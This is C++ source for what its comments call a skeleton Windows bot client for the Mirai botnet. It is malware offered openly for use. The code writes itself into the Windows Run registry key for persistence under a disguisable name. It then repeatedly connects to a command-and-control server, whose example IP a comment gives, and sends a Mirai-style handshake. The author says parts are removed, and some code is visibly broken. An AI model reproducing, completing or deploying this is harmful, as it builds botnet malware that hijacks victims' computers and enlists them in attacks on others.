// made by augboi incorporated
// established 2002
// based out of hoboken NJ

// shoot me an email! augustgl@protonmail.ch

// IMPORTANT NOTE
// DO NOT CHANGE THE EXTENSION TO .c
// IT BREAKS IT FOR SOME UNKNOWN REASON
// PROBABLY BECAUSE VISUAL STUDIO IS TERRIBLE SOFTWARE

// you may need to edit the mirai server 
// to handle windows clients

// to configure scroll down to establishconn()
// edit
// sockaddr.sin_addr.s_addr = inet_addr("209.141.33.126");
// x.x.x.x to your CNC IP address

// this is a skeleton
// I removed a bunch of code
// so most of these includes are useless

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <WS2tcpip.h>
#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>
#include <io.h>

#include <ShlObj.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_WORDS 4096

DWORD dwMainCommSock; // main socket
BOOL bConnection = FALSE; // boolean value for connection
UINT8 uiLen; // not used

void AddToStartup() { 
	BYTE chPath[MAX_PATH]; // buffer for path to this file 
	GetModuleFileName(NULL, (LPSTR)chPath, MAX_PATH); // get's full path to file

	HKEY hNewVal; // registry handle

	// you should know what this does
	// change "client" to the fake name in the registry
	// or even better
	// generate a random string for the startup name 

	RegOpenKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hNewVal);
	RegSetValueEx(hNewVal, "client", 0, REG_SZ, chPath, sizeof(chPath));
	
	// closes registry handle

	RegCloseKey(hNewVal);
}

// establishes connection

static void establishconn() {

	// DO NOT FUCKING REMOVE THIS

	WSAData wsa;
	iRes = WSAStartup(MAKEWORD(2, 2), &wsa); 

	// REMOVING WSAStartup will break winsock. 
	// Don't add another one too, that will also break winsock

	// new socket 
	dwMainCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if (dwMainCommSock == -1) {
		// if socket fails, bConnection becomes false, showing no connection
		bConnection = FALSE;
	}

	// sockaddr struct, has information about socket

	SOCKADDR_IN sockaddr;
	sockaddr.sin_port = htons(69);
	sockaddr.sin_family = AF_INET;

	// Just change the IP

	sockaddr.sin_addr.s_addr = inet_addr("x.x.x.x");
	
	// connects the socket to the server.
	// uses the sockaddr struct to pull info

	if (connect(dwMainCommSock, (SOCKADDR *)(&sockaddr), sizeof(sockaddr)) != 1) {
		// if successful, bConnection is TRUE
		bConnection = TRUE;
	}
	
	// error message for debugging. 

	wchar_t *wchError = NULL;
	FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, WSAGetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPWSTR)&wchError, 0, NULL);
	fprintf(stderr, "%S\n", wchError);
	LocalFree(wchError);
	
}

// drops connection

static void drop_con() {
	if (dwMainCommSock == -1) { // if dwmaincommsock = -1
		closesocket(dwMainCommSock); // closes socket
		dwMainCommSock = -1;
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
//int main() {
	
	
	AddToStartup(); // you should know what this does

	while (1) {


		//OutputDebugString("[*] CONNECTING TO SERVER");
		
		if (dwMainCommSock == -1) { // if socket is -1
			establishconn(); // establish connection
		}

		if (!bConnection) { // if bConnection is FALSE
			drop_con(); // drop connection
			Sleep(1); // sleep for 1 millisecond
			establishconn(); // try again
		}
		
		if (bConnection){ // uwu what's this? connection succsessful?
			// chIdBuf is for the buffer 
			// that the server needs to identify
			// the OS the client is running

			char *chIdBuf = NULL;
			//ZeroMemory(id_buf, sizeof(id_buf));
			// this is a windows bot
			// so the id buf is "windows"
			chIdBuf = (char *)"windows"; 
			UINT8 uintIdLen = strlen(chIdBuf); // length of the ID buffer

			// sends 4 bytes to connect

			send(dwMainCommSock, "\x00\x00\x00\x01", 4, NULL);
			send(dwMainCommSock, (const char *)&uintIdLen, sizeof(uintIdLen), NULL);

			if (uintIdLen > 0) { // if the length of ID is greater than 0
				// sends the ID buffer
				send(dwMainCommSock, chIdBuf, uintIdLen, NULL);
			}


			unsigned char chReadBuf[256] = { 0 };
			UINT16 uiLen;	
			/*
			int retval = recv(maincommsock, (char *)&len,sizeof(len), 0);	
			printf("retval: %d\n", retval);
			len = htons(len);
			if (retval == sizeof(len)) {
				retval = recv(maincommsock, (char *)rdbuf, len, 0);
				printf("retval: %d\n", retval);

				printf("RDBUF: %s\n", rdbuf);
			}
			*/
			
		}
	}

	return 0;
}
